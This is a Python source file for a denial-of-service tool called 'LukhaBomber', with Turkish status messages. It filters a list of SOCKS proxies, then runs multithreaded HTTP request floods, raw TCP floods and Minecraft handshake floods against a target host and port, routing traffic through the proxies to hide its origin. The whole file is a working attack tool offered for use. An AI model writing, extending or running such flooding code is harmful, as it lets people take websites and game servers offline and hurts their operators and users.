import socks
import socket
import random
import threading
import sys
import time
from concurrent.futures import ThreadPoolExecutor

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN)"
]

class LukhaBomber:
    def __init__(self, target, port, threads, total_requests, proxy_type, attack_target):
        self.target = target
        self.port = port
        self.threads = threads
        self.total_requests = total_requests
        self.proxy_type = proxy_type.lower()
        self.attack_target = attack_target
        self.counter = 0
        self.success = 0
        self.failed = 0
        self.running = True
        self.lock = threading.Lock()
        self.proxies = self.load_proxies()
        self.good_proxies = []
        self.bad_proxies = []

    def load_proxies(self):
        try:
            with open("proxy.txt", "r") as f:
                proxies = [line.strip() for line in f if ":" in line]
            if not proxies:
                print("Proxy listesi boş veya bulunamadı!")
                sys.exit(1)
            return proxies
        except FileNotFoundError:
            print("proxy.txt dosyası bulunamadı!")
            sys.exit(1)

    def test_proxy(self, proxy):
        ip, port = proxy.split(":")
        try:
            s = socks.socksocket()
            if self.proxy_type == "socks5":
                s.set_proxy(socks.SOCKS5, ip, int(port))
            else:
                s.set_proxy(socks.SOCKS4, ip, int(port))
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except:
            return False

    def filter_proxies(self):
        print(f"Toplam proxy: {len(self.proxies)}. Çalışan proxyler test ediliyor...")
        for proxy in self.proxies:
            if self.test_proxy(proxy):
                self.good_proxies.append(proxy)
            else:
                self.bad_proxies.append(proxy)
        print(f"Çalışan proxy sayısı: {len(self.good_proxies)}")
        if len(self.good_proxies) == 0:
            print("Çalışan proxy bulunamadı! Program sonlandırılıyor.")
            sys.exit(1)

    def create_socket(self, proxy_ip, proxy_port):
        s = socks.socksocket()
        if self.proxy_type == "socks5":
            s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        else:
            s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
        s.settimeout(5)
        return s

    def http_flood(self):
        while self.running:
            proxy = random.choice(self.good_proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                headers = [
                    "GET / HTTP/1.1",
                    f"Host: {self.target}",
                    f"User-Agent: {random.choice(USER_AGENTS)}",
                    "Accept: */*",
                    "Connection: keep-alive"
                ]
                s.send(("\r\n".join(headers) + "\r\n\r\n").encode())
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def tcp_flood(self):
        while self.running:
            proxy = random.choice(self.good_proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                s.send(random._urandom(1024))
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def minecraft_flood(self):
        while self.running:
            proxy = random.choice(self.good_proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                # Minecraft handshake + ping packet
                # Basit handshake paketi (server 25565 için)
                packet = b"\x00" + b"\x00" + b"\x0f" + b"\x00" + b"\x04" + bytes(self.target, 'utf-8') + self.port.to_bytes(2, 'big') + b"\x01"
                s.send(packet)
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def start(self):
        self.filter_proxies()
        print(f"Başlıyor... Hedef: {self.target}:{self.port}, Proxy Tipi: {self.proxy_type}, Hedef Türü: {self.attack_target}")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            if self.attack_target == "site":
                half_threads = max(1, self.threads // 2)
                for _ in range(half_threads):
                    executor.submit(self.http_flood)
                for _ in range(self.threads - half_threads):
                    executor.submit(self.tcp_flood)
            elif self.attack_target == "minecraft":
                for _ in range(self.threads):
                    executor.submit(self.minecraft_flood)
            else:
                print("Geçersiz hedef türü seçildi!")
                self.running = False
                return

            while self.running:
                time.sleep(0.3)

        print("\n\033[92mSaldırı tamamlandı!\033[0m")
        print(f"Toplam paket: {self.counter}")
        print(f"Başarılı: {self.success}")
        print(f"Başarısız: {self.failed}")
        print("\nİyi proxyler:")
        for p in self.good_proxies:
            print(" - " + p)
        if self.bad_proxies:
            print("\nKötü proxyler:")
            for p in self.bad_proxies:
                print(" - " + p)
